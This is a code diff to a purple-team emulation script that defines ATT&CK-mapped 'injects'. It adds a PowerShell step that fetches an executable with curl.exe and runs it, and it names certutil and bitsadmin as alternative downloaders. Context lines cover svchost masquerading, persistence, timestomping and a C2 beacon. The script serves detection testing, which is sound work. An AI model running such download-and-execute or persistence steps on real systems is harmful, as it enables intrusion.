@@ -72,6 +72,30 @@ def make_inject(key, title, desc, label, content, cleanup, aps, delay, executor=
 
 injects = []
 
+# 0. Ingress tool transfer (T1105) — pull the wld tool-under-test onto the host (FIRST)
+injects.append(make_inject("ingress",
+ "Ingress Tool Transfer — pull the wld tool onto the host (T1105)",
+ "First step of the chain: fetch the tool-under-test. curl.exe downloads the wld.exe binary from "
+ "the project's GitHub and runs `wld -h` (benign — prints usage) to prove download+execute, then "
+ "cleanup removes it. Detection: curl.exe writing a PE to disk and a new process spawning from it "
+ "(proxy/NDR tool transfer; EDR exec-after-download).",
+ "Ingress tool transfer (wld)",
+ "$url = 'https://raw.githubusercontent.com/s4nntysec/wetland/main/dist/release/wld-windows-x86_64.exe'\n"
+ "# (swap to a Release once published: .../releases/latest/download/wld-windows-x86_64.exe)\n"
+ "$dst = Join-Path $env:TEMP 'wetland-lab-wld.exe'\n"
+ "try {\n"
+ "  curl.exe -fsSL -o $dst $url\n"
+ "  if (Test-Path $dst) {\n"
+ "    Write-Output \"WETLAND-LAB ingress: downloaded wld.exe via curl.exe -> $dst (T1105)\"\n"
+ "    & $dst -h 2>&1 | Select-Object -First 2\n"
+ "  } else { Write-Output 'WETLAND-LAB ingress: no file written (proxy/AV?) — valid detection' }\n"
+ "} catch { Write-Output 'WETLAND-LAB ingress: download blocked by proxy/AV — valid detection' }\n"
+ "Write-Output 'detect: curl.exe writing a PE to disk then executing it; proxy/NDR tool transfer; EDR exec-after-download'\n"
+ "Write-Output 'alt LOLBins: certutil -urlcache -f <url> <out> ; bitsadmin /transfer'\n",
+ "Remove-Item (Join-Path $env:TEMP 'wetland-lab-wld.exe') -Force -ErrorAction SilentlyContinue\n"
+ "Write-Output 'WETLAND-LAB ingress: cleaned'\n",
+ [ap("T1105","Ingress Tool Transfer")], 0))
+
 # 1. Masquerade (T1036) — fake svchost.exe from a user-writable path
 injects.append(make_inject("masquerade",
  "Masquerade — fake svchost.exe from a user path (T1036)",
@@ -90,7 +114,7 @@ injects.append(make_inject("masquerade",
  "Remove-Item $dst -Force -ErrorAction SilentlyContinue\n"
  "Write-Output 'WETLAND-LAB masquerade: cleaned'\n",
  [ap("T1036.005","Match Legitimate Name or Location"),
-  ap("T1036.004","Masquerade Task or Service")], 0))
+  ap("T1036.004","Masquerade Task or Service")], 60))
 
 # 2. Scheduled Task persistence (T1053.005)
 injects.append(make_inject("persist_schtask",
@@ -105,7 +129,7 @@ injects.append(make_inject("persist_schtask",
  "Write-Output 'detect: schtasks /Query /TN WETLAND-LAB ; TaskScheduler/Operational 4698'\n",
  "schtasks /Delete /TN WETLAND-LAB /F | Out-Null\n"
  "Write-Output 'WETLAND-LAB persist[schtask]: cleaned'\n",
- [ap("T1053.005","Scheduled Task")], 60))
+ [ap("T1053.005","Scheduled Task")], 120))
 
 # 3. Registry Run-key persistence (T1547.001)
 injects.append(make_inject("persist_runkey",
@@ -119,7 +143,7 @@ injects.append(make_inject("persist_runkey",
  "Write-Output 'detect: reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ; Sysmon 13'\n",
  "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WETLAND-LAB' -ErrorAction SilentlyContinue\n"
  "Write-Output 'WETLAND-LAB persist[run-key]: cleaned'\n",
- [ap("T1547.001","Registry Run Keys / Startup Folder")], 120))
+ [ap("T1547.001","Registry Run Keys / Startup Folder")], 180))
 
 # 4. Hidden file + timestomp (T1564.001 / T1070.006)
 injects.append(make_inject("hide",
@@ -141,7 +165,7 @@ injects.append(make_inject("hide",
  "if (Test-Path $dst) { attrib -h $dst; Remove-Item $dst -Force -ErrorAction SilentlyContinue }\n"
  "Write-Output 'WETLAND-LAB hide: cleaned'\n",
  [ap("T1564.001","Hidden Files and Directories"),
-  ap("T1070.006","Timestomp")], 180))
+  ap("T1070.006","Timestomp")], 240))
 
 # 5. C2 beacon (T1071.001 / T1571)
 injects.append(make_inject("beacon",
@@ -164,28 +188,8 @@ injects.append(make_inject("beacon",
  "Write-Output 'detect: periodic outbound to one host; fixed UA; beaconing regularity (NetFlow/Zeek)'\n",
  None,
  [ap("T1071.001","Web Protocols"),
-  ap("T1571","Non-Standard Port")], 240))
+  ap("T1571","Non-Standard Port")], 300))
 
-# 6. Ingress tool transfer (T1105) — BENIGN EICAR download-detection test
-injects.append(make_inject("ingress_eicar",
- "Ingress Tool Transfer — benign EICAR download test (T1105)",
- "Detection test for 'a tool is pulled onto the host': curl.exe downloads the EICAR AV test "
- "file (an industry-standard, deliberately harmless detection artifact — NOT the wld binary) "
- "to a WETLAND-LAB temp path, then cleanup removes it. Exercises proxy/NDR tool-transfer and "
- "endpoint AV on-write. Blue team can also test the LOLBins certutil and bitsadmin.",
- "Ingress tool transfer (EICAR)",
- "$dst = Join-Path $env:TEMP 'wetland-lab-eicar.txt'\n"
- "curl.exe -s -o $dst https://secure.eicar.org/eicar.com.txt\n"
- "if (Test-Path $dst) {\n"
- "  Write-Output \"WETLAND-LAB ingress: downloaded EICAR test file via curl.exe -> $dst (T1105)\"\n"
- "} else {\n"
- "  Write-Output 'WETLAND-LAB ingress: download blocked by proxy/AV — that is a valid detection'\n"
- "}\n"
- "Write-Output 'detect: curl.exe writing a known-bad to disk; proxy/NDR tool transfer; AV on-write'\n"
- "Write-Output 'alt LOLBins to test: certutil -urlcache -f <url> <out> ; bitsadmin /transfer'\n",
- "Remove-Item (Join-Path $env:TEMP 'wetland-lab-eicar.txt') -Force -ErrorAction SilentlyContinue\n"
- "Write-Output 'WETLAND-LAB ingress: cleaned'\n",
- [ap("T1105","Ingress Tool Transfer")], 300))
 
 # ---- envelope ----
 out = copy.deepcopy(base)
